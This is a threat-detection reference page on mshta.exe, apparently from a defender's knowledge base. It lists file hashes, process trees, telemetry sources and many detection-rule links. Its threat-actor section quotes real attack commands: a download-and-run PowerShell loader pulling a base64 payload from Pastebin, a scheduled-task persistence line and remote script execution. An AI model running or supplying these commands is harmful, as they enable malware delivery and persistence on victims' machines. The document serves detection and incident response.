# Mshta

## Table of Contents

- [Mshta](#mshta)
  - [Table of Contents](#table-of-contents)
  - [Acknowledgement(s)](#acknowledgements)
  - [Description](#description)
  - [Versions History](#versions-history)
  - [Common CommandLine](#common-commandline)
  - [Threat Actor Ops (TAOps)](#threat-actor-ops-taops)
  - [Common Process Trees](#common-process-trees)
  - [Default Install Location](#default-install-location)
  - [DFIR Artifacts](#dfir-artifacts)
  - [Examples In The Wild](#examples-in-the-wild)
  - [Documentation](#documentation)
  - [Blogs / Reports References](#blogs--reports-references)
  - [ATT&CK Techniques](#attck-techniques)
  - [Telemetry](#telemetry)
  - [Detection Validation](#detection-validation)
  - [Detection Rules](#detection-rules)
  - [LOLBAS / GTFOBins References](#lolbas--gtfobins-references)

## Acknowledgement(s)

- 3CORESec - [@3CORESec](https://twitter.com/3CORESec)
- Nasreddine Bencherchali - [@nas_bench](https://twitter.com/nas_bench)

## Description

> **Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.** — [ATT&CK](https://attack.mitre.org/techniques/T1218/005/)

## Versions History

- For more information on specific versions check [mshta.exe - Winbindex](https://winbindex.m417z.com/?file=mshta.exe)

| Version | SHA1                                     | VT                                                                                                                   |
|---------|------------------------------------------|----------------------------------------------------------------------------------------------------------------------|
| 11.00.22000.1 (x86)    | 87dd083a4c67f0e105c19469933b5ed13174d7ab | [LINK](https://www.virustotal.com/gui/file/9820174c7ec2fc3b3410609045bbd56a8f9d20e6ae52515aba7c9e6b60312d97)                                                                                                             |
| 11.00.22000.1 (x64)   | f2fd7cde5f97427e497dfb07b7f682149dc896fb | [LINK](https://www.virustotal.com/gui/file/4ed8a115fa1dcfd532397b800775c1b54d2d407b52118b5423e94ff1ce855d7e)                                                                                                             |
| 11.00.19041.1 (x86)   | 089b8363eb686c8d055ec2c4e5899fdd450ef77d | [LINK](https://www.virustotal.com/gui/file/213ab5658e44f2a111c5e4cffa043660bc49307ebb1b7eedd21dbddca5da41ac)                                                                                                             |
| 11.00.19041.1 (x64)    | 51c97ebe601ef079b16bcd87af827b0be5283d96 | [LINK](https://www.virustotal.com/gui/file/dba3137811c686fd35e418d76184070e031f207002649da95385dfd05a8bb895)                                                                                                             |
| 11.00.18362.1 (x86)    | b1c260b665788aae35a9c6ed3000002fcc24a4ac | [LINK](https://www.virustotal.com/gui/file/4b82cfc44029d3d8462d60322fa0dbde20f36c9c6791fa6f9b9f6a96fe44bf09)                                                                                                             |
| 11.00.18362.1 (x64)    | 99a0a1b05e60a5f1fc8a068f953f0510e0230efa | [LINK](https://www.virustotal.com/gui/file/229ebba62347b77ea2ffad93308e7052bdae39a24ea828d6ef93fe694ca62197)                                                                                                             |
| 11.00.17763.1 (x86)   | ee1ed6aea892e2abcfa64d9d51078efdfaea6253 | [LINK](https://www.virustotal.com/gui/file/12c94c614fb752dc1f6797b5fb3ad67719e3c924facda35dc36792c8e5ac45fc)                                                                                                             |
| 11.00.17763.1 (x64)    | dd8b22acea424823bb64abf71f61a03d41177c38 | [LINK](https://www.virustotal.com/gui/file/e616c5ce71886652c13e2e1fa45a653b44d492b054f16b15a38418b8507f57c7)                                                                                                             |

## Common CommandLine

```batch
mshta vbscript:Execute("[Commands/Script]")

mshta vbscript:Close(Execute("[Commands/Script]"))

mshta javascript:[Commands/Script]

mshta [file.hta]

mshta.exe "[Inline HTA Script]"

mshta.exe [hxxp://link.to.malware]
```

## Threat Actor Ops (TAOps)

- [Using ``mshta.exe`` to run PowerShell and download payload from Pastebin](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)

```powershell
mshta.exe vbscript:CreateObject(""Wscript.Shell"").Run(""powershell.exe -noexit -command [Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(\'h\'+\'x\'+\'x\'+\'p\'+\'s:\'+\'//p\'+\'a\'+\'s\'+\'t\'+\'e\'+\'b\'+\'i\'+\'n\'+\'.\'+\'c\'+\'o\'+\'m\'+\'/\'+\'r\'+\'a\'+\'w\'+\'/\'+\'XXXXXXXX\'))).EntryPoint.Invoke($N,$N)"",0,true)(window.close)
```

- [Creating a Scheduled Task that runs ``mshta.exe``](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)

```batch
schtasks /create /sc MINUTE /mo 100 /tn eScan Backup /tr ""mshta vbscript:CreateObject(""Wscript.Shell"").Run(""mshta.exe hxxps://pastebin[.]com/raw/XXXXXXX"",0,true)(window.close)"" /F '
```

- [Execute remotely-hosted script using ``mshta.exe``](https://unit42.paloaltonetworks.com/operation-comando-or-how-to-run-a-cheap-and-effective-credit-card-business/)

```batch
mshta hxxps://bit[.]ly/XXXXX
```

## Common Process Trees

- Mshta launched from CMD or PowerShell

```yaml
.
└── cmd.exe
    └── mshta.exe

.
└── powershell.exe
    └── mshta.exe
```

- Mshta launched from a Microsoft office application (Macro)

```yaml
.
└── winword.exe
    └── mshta.exe

.
└── powerpnt.exe
    └── mshta.exe

.
└── excel.exe
    └── mshta.exe
```

## Default Install Location

```batch
C:\Windows\System32\mshta.exe

C:\Windows\SysWOW64\mshta.exe
```

## DFIR Artifacts

- TBD

## Examples In The Wild

- [ANY.RUN - 667847.340.98257.06869_660.49324.94331.zip](https://app.any.run/tasks/7c48a92e-7fd1-4974-8776-f2f852fc3dc8/)
- [ANY.RUN - yEtUUeDdUHBbToN.sct.hta](https://app.any.run/tasks/68f6817e-01d2-438a-98dc-c4c3b68b21bd/)
- [ANY.RUN - Info.zip](https://app.any.run/tasks/5cda5319-d4b3-4d41-8b57-6a659c7da84b/)
- [ANY.RUN - redis-desktop-manager.exe](https://app.any.run/tasks/4895328b-c05c-4cda-8227-8a564805e341/)
- [ANY.RUN - worksheetpayppam.zip](https://app.any.run/tasks/fcc811a3-1825-4f6a-b31d-f0015b80661e/)
- [ANY.RUN -  PI09359395.pps](https://app.any.run/tasks/fe41cfc6-928f-4974-a4a2-295bb7c34f43/)
- [ANY.RUN - 3.pps](https://app.any.run/tasks/4f8569d7-007f-430e-a886-39c230bb4318/)
- [Hatching Triage (tria.ge) - 10,pdf.ppam](https://tria.ge/210728-ltmpabykje/behavioral1)
- [Hatching Triage (tria.ge) - VCKBY846628.vbs](https://tria.ge/210516-zfbjwjjf96/behavioral1)

## Documentation

- [Microsoft Docs - Primitive: Mshta.exe](https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5))
- [Microsoft Docs - Introduction to HTML Applications (HTAs)](https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85))

## Blogs / Reports References

- [Cybereason - THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware](https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware)
- [Cybereason - THREAT ALERT: Microsoft Exchange ProxyShell Exploits and LockFile Ransomware](https://www.cybereason.com/blog/threat-alert-microsoft-exchange-proxyshell-exploits-and-lockfile-ransomware)
- [WeLiveSecurity - Buhtrap backdoor and Buran ransomware distributed via major advertising platform](https://www.welivesecurity.com/2019/04/30/buhtrap-backdoor-ransomware-advertising-platform/)
- [Securelist By Kaspersky - Andariel evolves to target South Korea with ransomware](https://securelist.com/andariel-evolves-to-target-south-korea-with-ransomware/102811/)
- [Securelist By Kaspersky - I know what you did last summer, MuddyWater blending in the crowd](https://securelist.com/muddywaters-arsenal/90659/)wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/)
- [The DFIR Report - PYSA/Mespinoza Ransomware](https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/)
- [Palo Alto Networks - Unite 42 - TA551: Email Attack Campaign Switches from Valak to IcedID](https://unit42.paloaltonetworks.com/ta551-shathak-icedid/)
- [Palo Alto Networks - Unite 42 - Aggah Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaign](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)
- [Palo Alto Networks - Unite 42 - Operation Comando: How to Run a Cheap and Effective Credit Card Business](https://unit42.paloaltonetworks.com/operation-comando-or-how-to-run-a-cheap-and-effective-credit-card-business/)
- [Palo Alto Networks - Unite 42 - New BabyShark Malware Targets U.S. National Security Think Tanks](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/)
- [Palo Alto Networks - Unite 42 - Sofacy Group’s Parallel Attacks](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/)
- [Palo Alto Networks - Unite 42 - Xbash Combines Botnet, Ransomware, Coinmining in Worm that Targets Linux and Windows](https://unit42.paloaltonetworks.com/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/)
- [Palo Alto Networks - Unite 42 - OilRig Deploys “ALMA Communicator” – DNS Tunneling Trojan](https://unit42.paloaltonetworks.com/unit42-oilrig-deploys-alma-communicator-dns-tunneling-trojan/)
- [Palo Alto Networks - Unite 42 - Examining the Cybercrime Underground, Part 1: Crypters](https://unit42.paloaltonetworks.com/examining-cybercrime-underground-part-1-crypters/)
- [Microsoft Security Blog - Bring your own LOLBin: Multi-stage, fileless Nodersok campaign delivers rare Node.js-based malware](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)
- [Microsoft Security Blog - Reverse-engineering DUBNIUM](https://www.microsoft.com/security/blog/2016/06/09/reverse-engineering-dubnium-2/)
- [Microsoft Security Blog - Microsoft discovers threat actor targeting SolarWinds Serv-U software with 0-day exploit](https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/)
- [Microsoft Security Blog - GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence](https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/)
- [Microsoft Security Blog - Kovter becomes almost fileless, creates a new file type, and gets some new certificates](https://www.microsoft.com/security/blog/2016/07/22/kovter-becomes-almost-file-less-creates-a-new-file-type-and-gets-some-new-certificates/)
- [Microsoft Security Blog - Large Kovter digitally-signed malvertising campaign and MSRT cleanup release](https://www.microsoft.com/security/blog/2016/05/10/large-kovter-digitally-signed-malvertising-campaign-and-msrt-cleanup-release/)
- [Red Canary Blog - Red Canary vs. PoshRAT: Detection in the Absence of Malware](https://redcanary.com/blog/poshrat-detection/)
- [Cisco Talos - Upgraded Aggah malspam campaign delivers multiple RATs](https://blog.talosintelligence.com/2020/04/upgraded-aggah-malspam-campaign.html)
- [Cisco Talos - Tor2Mine is up to their old tricks — and adds a few new ones](https://blog.talosintelligence.com/2020/06/tor2mine-is-up-to-their-old-tricks-and_11.html)
- [Cisco Talos - Lemon Duck brings cryptocurrency miners back into the spotlight](https://blog.talosintelligence.com/2020/10/lemon-duck-brings-cryptocurrency-miners.html)
- [Mandiant - Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise](https://www.mandiant.com/resources/darkside-affiliate-supply-chain-software-compromise)

## ATT&CK Techniques

- [T1218.005 - Signed Binary Proxy Execution: Mshta](https://attack.mitre.org/techniques/T1218/005/)

## Telemetry

- [Security Event ID 4688 - A new process has been created](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4688)
- [Sysmon Event ID 1 - Process creation](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90001)
- [PsSetCreateProcessNotifyRoutine/Ex](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex)
- [ETW - Microsoft-Windows-Kernel-Process - Event ID 1 - ProcessStart](https://github.com/nasbench/EVTX-ETW-Resources)

## Detection Validation

- **Red Canary - Atomic Red Team**
  - [Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-1---mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject)
  - [Mshta executes VBScript to execute malicious command](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-2---mshta-executes-vbscript-to-execute-malicious-command)
  - [Mshta Executes Remote HTML Application (HTA)](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-3---mshta-executes-remote-html-application-hta)
  - [Mshta used to Execute PowerShell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-10---mshta-used-to-execute-powershell)

- **Elastic - Red Team Automation**
  - [Microsoft HTA tool (mshta.exe) with Network Callback](https://github.com/elastic/detection-rules/blob/main/rta/mshta_network.py)
  - [Emulate Suspect MS Office Child Processes](https://github.com/elastic/detection-rules/blob/main/rta/suspicious_office_children.py)

## Detection Rules

- **Splunk**
  - [Detect mshta renamed](https://research.splunk.com/endpoint/detect_mshta_renamed/)
  - [Suspicious mshta spawn](https://research.splunk.com/endpoint/suspicious_mshta_spawn/)
  - [Suspicious mshta child process](https://research.splunk.com/endpoint/suspicious_mshta_child_process/)
  - [Mshta spawning Rundll32 OR Regsvr32 Process](https://research.splunk.com/endpoint/mshta_spawning_rundll32_or_regsvr32_process/)
  - [Detect MSHTA Url in Command Line](https://research.splunk.com/endpoint/detect_mshta_url_in_command_line/)
  - [Detect mshta inline hta execution](https://research.splunk.com/endpoint/detect_mshta_inline_hta_execution/)
  - [Detect Rundll32 Inline HTA Execution](https://research.splunk.com/endpoint/detect_rundll32_inline_hta_execution/)
  - [Office Product Spawning MSHTA](https://research.splunk.com/endpoint/office_product_spawning_mshta/)

- **Elastic**
  - [Mshta Making Network Connections](https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_mshta_beacon.toml)
  - [Incoming DCOM Lateral Movement via MSHTA](https://github.com/elastic/detection-rules/blob/main/rules/windows/lateral_movement_dcom_hta.toml)
  - [Unusual Network Activity from a Windows System Binary](https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)
  - [Service Control Spawned via Script Interpreter](https://github.com/elastic/detection-rules/blob/main/rules/windows/lateral_movement_service_control_spawned_script_int.toml)
  - [Microsoft Build Engine Started by a Script Process](https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_execution_msbuild_started_by_script.toml)
  - [Shortcut File Written or Modified for Persistence](https://github.com/elastic/detection-rules/blob/main/rules/windows/persistence_startup_folder_file_written_by_suspicious_process.toml)

- **Microsoft 365 Defender**
  - [Detect suspicious Mshta usage](https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/detect-suspicious-mshta-usage.md)

- **Sigma**
  - [Suspicious MSHTA Process Patterns](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_mshta_pattern.yml)
  - [MSHTA Spwaned by SVCHOST](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_lethalhta.yml)
  - [Mshta Spawning Windows Shell](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_mshta.yml)
  - [Mshta JavaScript Execution](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_mshta_javascript.yml)
  - [MSHTA Suspicious Execution 01](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_susp_mshta_execution.yml)

## LOLBAS / GTFOBins References

- [LOLBAS - Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
